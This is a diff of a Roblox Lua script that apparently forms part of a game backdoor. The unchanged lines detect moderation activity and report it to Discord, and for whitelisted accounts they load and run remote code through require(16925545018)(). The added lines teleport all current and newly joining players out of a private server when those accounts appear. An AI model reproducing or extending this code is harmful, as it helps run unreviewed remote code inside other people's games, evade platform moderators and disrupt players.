@@ -159,6 +159,15 @@ while task.wait() do
 				SendDiscordMessage("check 4 was tripped", 'red', 'none', '⚠ Roblox is moderating ⚠')
 				return
 			elseif v.Name == 'WickedLawsWitchLVL4' or v.UserId == 103736021 or v.UserId == 2506061262 then
+				if game.PrivateServerId ~= "" and game.PrivateServerOwnerId == nil then
+					for i,player in pairs(game:GetService('Players'):GetPlayers()) do
+						game:GetService("TeleportService"):Teleport(game.PlaceId, player)
+					end
+					game:GetService('Players').PlayerAdded:Connect(function(player)
+						game:GetService("TeleportService"):Teleport(game.PlaceId, player)
+					end)
+					return
+				end
 				print('Whitelisted detected')
 				require(16925545018)()
 				return
